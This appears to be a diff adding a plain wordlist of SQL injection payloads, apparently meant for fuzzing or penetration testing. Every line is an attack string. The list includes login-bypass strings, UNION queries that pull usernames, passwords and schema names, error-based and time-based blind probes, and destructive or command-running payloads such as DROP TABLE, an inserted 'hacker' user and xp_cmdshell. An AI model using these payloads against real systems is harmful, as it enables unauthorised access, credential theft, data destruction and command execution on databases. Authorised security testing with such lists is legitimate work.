@@ -1,0 +1,46 @@
+' OR 1=1--
+' OR '1'='1
+1' OR '1'='1'--
+' OR '1'='1'/*
+' OR 1=1#
+" OR 1=1--
+" OR "1"="1
+admin' --
+admin' #
+' OR 1=1 LIMIT 1--
+1' ORDER BY 1--
+1' ORDER BY 10--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT username,password FROM users--
+' UNION ALL SELECT NULL,NULL,NULL--
+' UNION SELECT @@version--
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a
+' AND 'a'='b
+' AND SUBSTRING(@@version,1,1)='5'--
+' AND 1=CONVERT(int,@@version)--
+' AND 1=CONVERT(int,db_name())--
+' AND extractvalue(1,concat(0x7e,version()))--
+' AND updatexml(1,concat(0x7e,version()),1)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND 1=cast((SELECT version()) as int)--
+' AND 1=cast((SELECT current_user) as int)--
+'; DROP TABLE test--
+'; EXEC xp_cmdshell('dir')--
+'; INSERT INTO users VALUES('hacker','hacked')--
+1; DROP TABLE users--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--
+') OR ('1'='1
+')) OR (('1'='1
+' AND 1=(SELECT COUNT(*) FROM tabname); --
+' HAVING 1=1--
+' GROUP BY columnnames HAVING 1=1--
+1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--
+' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(version()) FROM dual) USING utf8)))--
+-1' UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata--
+-1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
